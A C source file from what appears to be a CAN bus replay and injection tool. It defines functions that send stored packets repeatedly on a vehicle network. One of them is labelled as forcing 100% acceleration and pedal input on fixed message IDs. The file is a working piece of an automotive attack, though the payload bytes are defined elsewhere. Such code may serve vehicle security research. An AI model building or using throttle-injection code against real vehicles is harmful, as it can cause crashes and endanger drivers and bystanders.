#include "all_headers.h"

/*================================================================
replay.c
This function replays CAN packets with or without payloads.

functions:
- replay_replay: replays CAN packets with payloads
- replay_suddenaccel: replays CAN packets with payloads (accel 100% && pedal 100%)

Parameters:
- socket: CAN socket
- addr: CAN address
==================================================================*/

void replay_replay(int socket, struct sockaddr_can *addr, int canid, int time_diff){
    
    do {
        send_can_packet(socket, addr, replay.payload1, replay.payload1_len, canid);
        send_can_packet(socket, addr, replay.payload2, replay.payload2_len, canid);
        if (time_diff == 0) break;
        usleep(time_diff * 1000);
    } while (1);
}

void replay_suddenaccel(int socket, struct sockaddr_can *addr, int canid, int time_diff){
    do {
        send_can_packet(socket, addr, replay.payload1, replay.payload1_len, 0x24);
        send_can_packet(socket, addr, replay.payload2, replay.payload2_len, 0x39);
        if (time_diff == 0) break;
        usleep(time_diff * 1000);
    } while (1);
}
